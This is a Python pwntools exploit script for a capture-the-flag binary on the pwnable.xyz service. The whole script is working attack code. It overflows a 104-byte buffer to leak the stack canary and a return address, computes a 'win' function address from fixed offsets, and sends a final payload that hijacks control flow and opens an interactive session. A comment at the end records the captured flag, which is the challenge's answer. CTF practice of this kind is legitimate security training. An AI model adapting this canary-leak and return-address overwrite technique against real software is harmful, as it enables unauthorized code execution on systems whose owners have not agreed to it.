from pwn import *
from Crypto.Util.number import bytes_to_long, long_to_bytes
import time


def main():
    # r = process('./bin')
    r = remote('svc.pwnable.xyz',30027)
    stage = 0
    canary = None
    win = None

    while(1):
        r.recvuntil("> ")
        s = r.recvline().strip()
        print(len(s))
        print(s)
        payload_1 = b'A' * 104
        if len(s) >= 105 and stage == 0:
            # gdb.attach(r)
            # time.sleep(1)

            r.sendlineafter("> ", payload_1)
            r.recvline()
            leak = r.recvline().split(b'I')[0]
            print(leak, len(leak))
            print(leak.hex())
            canary = b'\x00' + leak[:7] # this should be the correct order
                                # remember to add 0x00
            print(canary.hex())
            stage = 1

        elif len(s) >= 120 and stage == 1:
            payload_2 = b'A' * 104
            payload_2 += b'C' * 8
            payload_2 += b'B' * 7
            r.sendlineafter("> ", payload_2)
            l = r.recvline()
            print("line: ", l)
            rip = r.recvline().split(b'I')[0]
            rip = rip[::-1]
            print("rip", rip.hex())
            rip = bytes_to_long(rip)
            rip -= 0x1081
            rip += 0xd30
            win = rip
            stage = 2
            

        elif len(s) >= 126 and stage == 2:
            print("final")
            payload_3 = b'A' * 104
            payload_3 += canary
            payload_3 += b'B' * 8
            payload_3 += p64(win)[:6]
            r.sendafter("> ", payload_3)
            # gdb.attach(r)
            # time.sleep(1)
            r.interactive()
            
        else:
            print("bad, continue")
            r.sendlineafter("> ", "A")
        # r.interactive()
        # break


if __name__ == '__main__':
    main()
    # flag: FLAG{badayum-yadam-dayum-yadam-badum}
